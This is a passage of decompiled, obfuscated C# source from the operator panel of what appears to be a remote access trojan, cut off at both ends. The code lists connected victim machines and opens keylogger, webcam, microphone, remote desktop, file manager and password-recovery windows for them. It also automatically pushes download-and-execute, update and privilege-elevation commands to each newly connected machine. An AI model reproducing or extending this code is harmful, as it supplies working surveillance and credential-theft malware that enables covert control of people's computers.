  internal virtual void vmethod_145(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_25 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_146() => this.toolStripMenuItem_26;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_147(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_20);
    if (this.toolStripMenuItem_26 != null)
      this.toolStripMenuItem_26.Click -= eventHandler;
    this.toolStripMenuItem_26 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_26 == null)
      return;
    this.toolStripMenuItem_26.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_148() => this.toolStripMenuItem_27;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_149(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_21);
    if (this.toolStripMenuItem_27 != null)
      this.toolStripMenuItem_27.Click -= eventHandler;
    this.toolStripMenuItem_27 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_27 == null)
      return;
    this.toolStripMenuItem_27.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_150() => this.toolStripMenuItem_28;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_151(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_38);
    if (this.toolStripMenuItem_28 != null)
      this.toolStripMenuItem_28.Click -= eventHandler;
    this.toolStripMenuItem_28 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_28 == null)
      return;
    this.toolStripMenuItem_28.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_152() => this.toolStripMenuItem_29;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_153(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_22);
    if (this.toolStripMenuItem_29 != null)
      this.toolStripMenuItem_29.Click -= eventHandler;
    this.toolStripMenuItem_29 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_29 == null)
      return;
    this.toolStripMenuItem_29.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_154() => this.toolStripMenuItem_30;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_155(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_37);
    if (this.toolStripMenuItem_30 != null)
      this.toolStripMenuItem_30.Click -= eventHandler;
    this.toolStripMenuItem_30 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_30 == null)
      return;
    this.toolStripMenuItem_30.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_156() => this.toolStripMenuItem_31;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_157(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_35);
    if (this.toolStripMenuItem_31 != null)
      this.toolStripMenuItem_31.Click -= eventHandler;
    this.toolStripMenuItem_31 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_31 == null)
      return;
    this.toolStripMenuItem_31.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_158() => this.toolStripMenuItem_32;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_159(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_32 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_160() => this.toolStripMenuItem_33;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_161(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_33 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_162() => this.toolStripMenuItem_34;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_163(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_14);
    if (this.toolStripMenuItem_34 != null)
      this.toolStripMenuItem_34.Click -= eventHandler;
    this.toolStripMenuItem_34 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_34 == null)
      return;
    this.toolStripMenuItem_34.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_164() => this.toolStripMenuItem_35;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_165(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_15);
    if (this.toolStripMenuItem_35 != null)
      this.toolStripMenuItem_35.Click -= eventHandler;
    this.toolStripMenuItem_35 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_35 == null)
      return;
    this.toolStripMenuItem_35.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_166() => this.toolStripMenuItem_36;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_167(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_16);
    if (this.toolStripMenuItem_36 != null)
      this.toolStripMenuItem_36.Click -= eventHandler;
    this.toolStripMenuItem_36 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_36 == null)
      return;
    this.toolStripMenuItem_36.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_168() => this.toolStripMenuItem_37;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_169(ToolStripMenuItem toolStripMenuItem_41) => this.toolStripMenuItem_37 = toolStripMenuItem_41;

  internal virtual ToolStripMenuItem vmethod_170() => this.toolStripMenuItem_38;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_171(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_57);
    if (this.toolStripMenuItem_38 != null)
      this.toolStripMenuItem_38.Click -= eventHandler;
    this.toolStripMenuItem_38 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_38 == null)
      return;
    this.toolStripMenuItem_38.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_172() => this.toolStripMenuItem_39;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_173(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_58);
    if (this.toolStripMenuItem_39 != null)
      this.toolStripMenuItem_39.Click -= eventHandler;
    this.toolStripMenuItem_39 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_39 == null)
      return;
    this.toolStripMenuItem_39.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_174() => this.toolStripMenuItem_40;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_175(ToolStripMenuItem toolStripMenuItem_41)
  {
    EventHandler eventHandler = new EventHandler(this.method_34);
    if (this.toolStripMenuItem_40 != null)
      this.toolStripMenuItem_40.Click -= eventHandler;
    this.toolStripMenuItem_40 = toolStripMenuItem_41;
    if (this.toolStripMenuItem_40 == null)
      return;
    this.toolStripMenuItem_40.Click += eventHandler;
  }

  private void method_1() => this.method_2();

  public void method_2()
  {
    if (this.DesignMode)
      return;
    try
    {
      if (this.bool_0)
        return;
      this.AutoScroll = true;
      this.AutoScaleMode = AutoScaleMode.Font;
      this.method_0();
      this.bool_0 = true;
      this.method_48();
      this.method_3();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void UserControlClients_Load(object sender, EventArgs e)
  {
    this.method_47();
    this.method_46();
    new Thread(new ThreadStart(this.method_45))
    {
      IsBackground = true
    }.Start();
  }

  private void method_3()
  {
    if (this.DesignMode)
      return;
    List<GClass24> gclass24List = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_3();
    if (gclass24List == null)
      return;
    try
    {
      foreach (GClass24 gclass24 in gclass24List)
        this.method_4(new ListViewItem()
        {
          Text = gclass24.string_8,
          ImageIndex = this.method_49(gclass24.string_0),
          SubItems = {
            gclass24.string_0,
            gclass24.string_1,
            gclass24.string_2,
            gclass24.string_3,
            gclass24.string_4,
            gclass24.string_5,
            gclass24.string_6
          },
          Tag = (object) gclass24.string_7,
          ForeColor = Color.Gray
        });
    }
    finally
    {
      List<GClass24>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_4(ListViewItem listViewItem_0)
  {
    if (this.InvokeRequired)
    {
      this.Invoke((Delegate) new UserControlClients.Delegate18(this.method_4), (object) listViewItem_0);
    }
    else
    {
      if (!this.method_52("{Offline Clients}"))
        this.vmethod_82().Groups.Add(new ListViewGroup("{Offline Clients}"));
      listViewItem_0.Group = this.vmethod_82().Groups[Class97.smethod_14((ListView) this.vmethod_108(), "{Offline Clients}")];
      this.vmethod_82().Items.Add(listViewItem_0);
    }
  }

  public void method_5(GClass18 gclass18_0, object[] object_0)
  {
    UserControlClients.Class138 class138 = new UserControlClients.Class138();
    class138.gclass18_0 = gclass18_0;
    class138.userControlClients_0 = this;
    try
    {
      UserControlClients.Class138.Class139 class139 = new UserControlClients.Class138.Class139();
      class139.class138_0 = class138;
      string str1 = (string) object_0[1];
      if (!class138.gclass18_0.method_12())
        Class97.list_0.Add(class138.gclass18_0);
      class138.gclass18_0.method_20().string_15 = object_0.Length - 1 != 18 ? class138.gclass18_0.method_24().Address.ToString() : Conversions.ToString(object_0[18]);
      string str2 = Class97.gclass21_0.method_55(class138.gclass18_0.method_20().string_15);
      if (Operators.CompareString(str2, "0", false) == 0)
        str2 = Conversions.ToString(object_0[2]);
      if (Operators.CompareString(str2, "N/A", false) == 0)
        str2 = Conversions.ToString(object_0[2]);
      if (Operators.CompareString(str2, "Private", false) == 0)
        str2 = Conversions.ToString(object_0[2]);
      if (Operators.CompareString(class138.gclass18_0.method_20().string_15, "255.255.255.255", false) == 0)
        str2 = Conversions.ToString(object_0[2]);
      string str3 = Conversions.ToString(object_0[3]);
      string text1 = Conversions.ToString(object_0[4]);
      string text2 = Conversions.ToString(object_0[5]);
      string str4 = Conversions.ToString(object_0[6]);
      string text3 = Conversions.ToString(object_0[7]);
      string text4 = Conversions.ToString(object_0[8]);
      Conversions.ToString(object_0[9]);
      string text5 = Conversions.ToString(object_0[10]);
      string text6 = Conversions.ToString(object_0[11]);
      string text7 = Conversions.ToString(object_0[12]);
      string text8 = Conversions.ToString(object_0[13]);
      string text9 = Conversions.ToString(object_0[14]);
      string str5 = Conversions.ToString(object_0[15]);
      string Left = string.Empty;
      if (object_0.Length - 1 != 15)
      {
        Conversions.ToString(object_0[16]);
        Left = Conversions.ToString(object_0[17]);
      }
      class138.gclass18_0.method_20().gclass18_0 = class138.gclass18_0;
      class138.gclass18_0.method_20().string_1 = text2;
      class138.gclass18_0.method_20().string_2 = str4;
      class138.gclass18_0.method_20().string_12 = text5;
      class138.gclass18_0.method_20().ushort_0 = Conversions.ToUShort(str3);
      class138.gclass18_0.method_20().string_7 = str2;
      class138.gclass18_0.method_20().string_3 = text3;
      class138.gclass18_0.method_20().string_4 = text8;
      class138.gclass18_0.method_20().string_5 = text7;
      class138.gclass18_0.method_20().string_6 = text4;
      class139.listViewItem_0 = new ListViewItem();
      class139.listViewItem_0.Tag = (object) class138.gclass18_0;
      class139.listViewItem_0.Name = str1;
      class139.listViewItem_0.ImageIndex = this.method_49(str2);
      class139.listViewItem_0.Text = str2;
      class139.listViewItem_0.SubItems.Add(text9);
      class139.listViewItem_0.SubItems.Add(text2);
      class139.listViewItem_0.SubItems.Add(text1);
      try
      {
        class139.listViewItem_0.SubItems.Add(this.method_51(Conversions.ToInteger(str5)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        class139.listViewItem_0.SubItems.Add(Conversions.ToString(-1));
        ProjectData.ClearProjectError();
      }
      if (Operators.CompareString(Left, string.Empty, false) == 0)
        Left = "0";
      class139.listViewItem_0.SubItems.Add(Left + "%");
      class139.listViewItem_0.SubItems.Add(text6);
      class139.listViewItem_0.SubItems.Add(text3);
      class139.listViewItem_0.SubItems.Add(text5);
      class139.listViewItem_0.SubItems.Add(class138.gclass18_0.method_20().string_15);
      class139.listViewItem_0.SubItems.Add(text8);
      class139.listViewItem_0.SubItems.Add(text7);
      class139.listViewItem_0.SubItems.Add(text4);
      class139.listViewItem_0.SubItems.Add("?");
      class139.listViewItem_0.SubItems.Add(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_13(class138.gclass18_0));
      string str6 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_4(class138.gclass18_0);
      class138.gclass18_0.method_20().string_14 = str6;
      this.Invoke((Delegate) new Delegate0(class139._Lambda\u0024__66));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_6(GClass18 gclass18_0, ListViewItem listViewItem_0, int int_0)
  {
    if (!this.method_52(listViewItem_0.SubItems[int_0].Text))
      this.vmethod_108().Groups.Add(new ListViewGroup(listViewItem_0.SubItems[int_0].Text));
    listViewItem_0.Group = this.vmethod_108().Groups[Class97.smethod_14((ListView) this.vmethod_108(), listViewItem_0.SubItems[int_0].Text)];
    this.vmethod_108().BeginUpdate();
    this.vmethod_108().Items.Add(listViewItem_0);
    this.vmethod_108().method_5(listViewItem_0.Index, 1, listViewItem_0);
    this.vmethod_108().method_5(listViewItem_0.Index, 7, listViewItem_0);
    this.vmethod_108().method_5(listViewItem_0.Index, 10, listViewItem_0);
    this.vmethod_108().EndUpdate();
    gclass18_0.method_20().listViewItem_4 = listViewItem_0;
    this.method_8(gclass18_0);
  }

  private int method_7()
  {
    if (Class97.generalSettings_0.get_SortByCountry())
      return 0;
    if (Class97.generalSettings_0.get_SortById())
      return 3;
    return Class97.generalSettings_0.get_SortByOperatingSystem() ? 7 : 0;
  }

  private void method_8(GClass18 gclass18_0)
  {
    try
    {
      this.vmethod_76().Text = string.Format("Connected Clients: {0}", (object) Class97.list_0.Count);
      if (Class97.generalSettings_0.Notification)
        this.method_11(gclass18_0);
      if (Class97.generalSettings_0.SoundNotification)
        Class132.smethod_0().Audio.Play(Class97.smethod_8("Sounds\\Notification.wav"));
      Class97.gclass2_0.method_0("[Network] Client Connected: " + gclass18_0.method_20().string_1, Class97.gclass2_0.textStyle_1);
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_0(gclass18_0);
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.gclass22_0.method_1(gclass18_0, true);
      try
      {
        foreach (ListViewItem listViewItem in this.vmethod_82().Items)
        {
          if (Operators.ConditionalCompareObjectEqual(listViewItem.Tag, (object) gclass18_0.method_20().method_0(), false))
            this.vmethod_82().Items.Remove(listViewItem);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      if (!gclass18_0.method_12())
      {
        try
        {
          foreach (ListViewItem listViewItem in Class97.formMain_0.vmethod_8().vmethod_18().Items)
          {
            if ((int) Conversions.ToUShort(listViewItem.Text) == (int) gclass18_0.method_20().ushort_0)
            {
              ListViewItem.ListViewSubItem subItem = listViewItem.SubItems[1];
              subItem.Text = Conversions.ToString(Conversions.ToDouble(subItem.Text) + 1.0);
            }
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      gclass18_0.method_20().listViewItem_4.SubItems[13].Text = gclass18_0.method_20().string_14;
      new Thread((ParameterizedThreadStart) (object_0 => this.method_9((GClass18) object_0))).Start((object) gclass18_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  private void method_9(GClass18 gclass18_0)
  {
    try
    {
      foreach (GClass20 gclass20_0 in dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.list_0)
      {
        if (Operators.CompareString(gclass20_0.string_1, "All", false) != 0)
        {
          if (Operators.CompareString(gclass18_0.method_20().string_12, gclass20_0.string_1, false) == 0)
          {
            this.method_10(gclass18_0, gclass20_0);
            break;
          }
        }
        else
        {
          this.method_10(gclass18_0, gclass20_0);
          break;
        }
      }
    }
    finally
    {
      List<GClass20>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_10(GClass18 gclass18_0, GClass20 gclass20_0)
  {
    Class97.gclass2_0.method_0(string.Format("[Network] Running OnConnect Command: {0} on Client {1}", (object) gclass20_0.genum6_0.ToString(), (object) gclass18_0.method_20().string_1), Class97.gclass2_0.textStyle_0);
    switch (gclass20_0.genum6_0)
    {
      case GClass20.GEnum6.DownloadExecute:
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[4]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Execute,
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket.Download,
          (object) gclass20_0.string_0,
          (object) (Conversions.ToString(this.random_0.Next(1000, 100000)) + Path.GetExtension(gclass20_0.string_0))
        });
        break;
      case GClass20.GEnum6.Update:
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[4]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Execute,
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket.Update,
          (object) gclass20_0.string_0,
          (object) (Conversions.ToString(this.random_0.Next(1000, 100000)) + Path.GetExtension(gclass20_0.string_0))
        });
        break;
      case GClass20.GEnum6.Elevate:
        if (Operators.CompareString(gclass18_0.method_20().string_5, "Administrator", false) == 0 || !Class97.smethod_22(gclass18_0.method_20().string_12, "4.4.1"))
          break;
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(gclass18_0, new object[1]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Elevate
        });
        break;
    }
  }

  private void method_11(GClass18 gclass18_0)
  {
    if (this.method_12(gclass18_0))
      return;
    this.queue_0.Enqueue(gclass18_0);
  }

  private bool method_12(GClass18 gclass18_0)
  {
    int num = Class97.formToast_0.Length - 1;
    for (int int_1 = 0; int_1 <= num; ++int_1)
    {
      if (Class97.formToast_0[int_1] == null && gclass18_0.method_20() != null)
      {
        FormToast formToast = new FormToast(int_1, gclass18_0, this.vmethod_38().Images[this.method_49(gclass18_0.method_20().string_7)]);
        Class97.formToast_0[int_1] = formToast;
        formToast.Show();
        return true;
      }
    }
    return false;
  }

  public void method_13(GClass18 gclass18_0)
  {
    if (this.InvokeRequired)
    {
      this.Invoke((Delegate) new Class97.Delegate11(this.method_13), (object) gclass18_0);
    }
    else
    {
      this.vmethod_76().Text = string.Format("Connected Clients: {0}", (object) Class97.list_0.Count);
      Class97.gclass2_0.method_0(string.Format("[Network] Client Disconnected: {0}", (object) gclass18_0.method_20().string_1), Class97.gclass2_0.textStyle_0);
      this.vmethod_108().Items.RemoveByKey(gclass18_0.method_20().string_0);
      if (gclass18_0.method_20().listViewItem_3 != null)
        gclass18_0.method_20().listViewItem_3.Remove();
      if (gclass18_0.method_20().newFormSystemManagers_0 != null)
        gclass18_0.method_20().newFormSystemManagers_0.Close();
      if (gclass18_0.method_20().formDesktop_0 != null)
        gclass18_0.method_20().formDesktop_0.Close();
      if (gclass18_0.method_20().formFileManager_0 != null)
        gclass18_0.method_20().formFileManager_0.Close();
      if (gclass18_0.method_20().formKeylogger_0 != null)
        gclass18_0.method_20().formKeylogger_0.Close();
      if (gclass18_0.method_20().formCamera_0 != null)
        gclass18_0.method_20().formCamera_0.Close();
      if (gclass18_0.method_20().formExecuteUpdate_0 != null)
      {
        if (gclass18_0.method_20().formExecuteUpdate_0.bool_2)
          gclass18_0.method_20().formExecuteUpdate_0.Text = string.Format("Upload - Clients Connected: {0}", (object) gclass18_0.method_20().formExecuteUpdate_0.list_0.Count);
        else
          gclass18_0.method_20().formExecuteUpdate_0.Text = string.Format("Direct Link - Clients Connected: {0}", (object) gclass18_0.method_20().formExecuteUpdate_0.list_0.Count);
      }
      if (gclass18_0.method_20().formPassword_0 != null)
      {
        gclass18_0.method_20().formPassword_0.list_0.Remove(gclass18_0);
        gclass18_0.method_20().formPassword_0.Text = string.Format("Password Recovery - Clients Connected: {0}", (object) gclass18_0.method_20().formPassword_0.list_0.Count);
      }
      if (!gclass18_0.method_12())
      {
        try
        {
          foreach (ListViewItem listViewItem in Class97.formMain_0.vmethod_8().vmethod_18().Items)
          {
            if ((int) Conversions.ToUShort(listViewItem.Text) == (int) gclass18_0.method_20().ushort_0)
            {
              ListViewItem.ListViewSubItem subItem = listViewItem.SubItems[1];
              subItem.Text = Conversions.ToString(Conversions.ToDouble(subItem.Text) - 1.0);
            }
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      if (gclass18_0.method_20().userControlThumbnail_0 != null)
      {
        try
        {
          Class97.formMain_0.vmethod_18().vmethod_6().Controls.Remove((Control) gclass18_0.method_20().userControlThumbnail_0);
          if (Class97.formMain_0.vmethod_18().list_0.Contains(gclass18_0.method_20().userControlThumbnail_0))
            Class97.formMain_0.vmethod_18().list_0.Remove(gclass18_0.method_20().userControlThumbnail_0);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      this.method_4(new ListViewItem()
      {
        Text = gclass18_0.method_20().string_14,
        ImageIndex = this.method_49(gclass18_0.method_20().string_7),
        SubItems = {
          gclass18_0.method_20().string_7,
          gclass18_0.method_20().string_1,
          gclass18_0.method_20().string_3,
          gclass18_0.method_20().string_12,
          gclass18_0.method_20().string_15,
          gclass18_0.method_20().string_5,
          gclass18_0.method_20().string_6
        },
        Tag = (object) gclass18_0.method_20().method_0(),
        ForeColor = Color.Gray
      });
    }
  }

  private void method_14(object sender, EventArgs e)
  {
    Class97.generalSettings_0.set_SortByCountry(true);
    Class97.generalSettings_0.set_SortById(false);
    Class97.generalSettings_0.set_SortByOperatingSystem(false);
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_108().Items)
      {
        if (!this.method_52(listViewItem.SubItems[0].Text))
          this.vmethod_108().Groups.Add(new ListViewGroup(listViewItem.SubItems[0].Text));
        listViewItem.Group = this.vmethod_108().Groups[Class97.smethod_14((ListView) this.vmethod_108(), listViewItem.SubItems[0].Text)];
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    Class148.smethod_6();
  }

  private void method_15(object sender, EventArgs e)
  {
    Class97.generalSettings_0.set_SortByCountry(false);
    Class97.generalSettings_0.set_SortById(true);
    Class97.generalSettings_0.set_SortByOperatingSystem(false);
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_108().Items)
      {
        if (!this.method_52(listViewItem.SubItems[3].Text))
          this.vmethod_108().Groups.Add(new ListViewGroup(listViewItem.SubItems[3].Text));
        listViewItem.Group = this.vmethod_108().Groups[Class97.smethod_14((ListView) this.vmethod_108(), listViewItem.SubItems[3].Text)];
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    Class148.smethod_6();
  }

  private void method_16(object sender, EventArgs e)
  {
    Class97.generalSettings_0.set_SortByCountry(false);
    Class97.generalSettings_0.set_SortById(false);
    Class97.generalSettings_0.set_SortByOperatingSystem(true);
    try
    {
      foreach (ListViewItem listViewItem in this.vmethod_108().Items)
      {
        if (!this.method_52(listViewItem.SubItems[7].Text))
          this.vmethod_108().Groups.Add(new ListViewGroup(listViewItem.SubItems[7].Text));
        listViewItem.Group = this.vmethod_108().Groups[Class97.smethod_14((ListView) this.vmethod_108(), listViewItem.SubItems[7].Text)];
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    Class148.smethod_6();
  }

  private void method_17(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().newFormSystemManagers_0))
        {
          NewFormSystemManagers formSystemManagers = new NewFormSystemManagers(tag);
          formSystemManagers.Show();
          tag.method_20().newFormSystemManagers_0 = formSystemManagers;
        }
        else
          this.method_54((Form) tag.method_20().newFormSystemManagers_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_18(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formFileManager_0))
          new FormFileManager(tag).Show();
        else
          this.method_54((Form) tag.method_20().formFileManager_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_19(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formDesktop_0))
        {
          FormDesktop formDesktop = new FormDesktop(tag);
          formDesktop.Show();
          tag.method_20().formDesktop_0 = formDesktop;
        }
        else
          this.method_54((Form) tag.method_20().formDesktop_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_20(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formCamera_0))
        {
          FormCamera formCamera = new FormCamera(tag);
          formCamera.Show();
          tag.method_20().formCamera_0 = formCamera;
        }
        else
          this.method_54((Form) tag.method_20().formCamera_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_21(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formKeylogger_0))
        {
          FormKeylogger formKeylogger = new FormKeylogger(tag);
          formKeylogger.Show();
          tag.method_20().formKeylogger_0 = formKeylogger;
        }
        else
          this.method_54((Form) tag.method_20().formKeylogger_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_22(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
      {
        GClass18 tag = (GClass18) selectedItem.Tag;
        if (!this.method_53((Form) tag.method_20().formMicrophone_0))
        {
          FormMicrophone formMicrophone = new FormMicrophone(tag);
          formMicrophone.Show();
          tag.method_20().formMicrophone_0 = formMicrophone;
        }
        else
          this.method_54((Form) tag.method_20().formMicrophone_0);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_23(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    List<GClass18> list_1 = new List<GClass18>();
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
        list_1.Add((GClass18) selectedItem.Tag);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    FormPassword formPassword = new FormPassword(list_1);
    formPassword.Show();
    try
    {
      foreach (GClass18 gclass18 in list_1)
        gclass18.method_20().formPassword_0 = formPassword;
    }
    finally
    {
      List<GClass18>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_24(object sender, EventArgs e) => this.method_40(true, true, false, true);

  private void method_25(object sender, EventArgs e) => this.method_40(true, false, true, false);

  private void method_26(object sender, EventArgs e) => this.method_40(false, true, false, true);

  private void method_27(object sender, EventArgs e) => this.method_40(false, true, true, false);

  private void method_28(object sender, EventArgs e)
  {
    if (this.vmethod_108().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_108().SelectedItems)
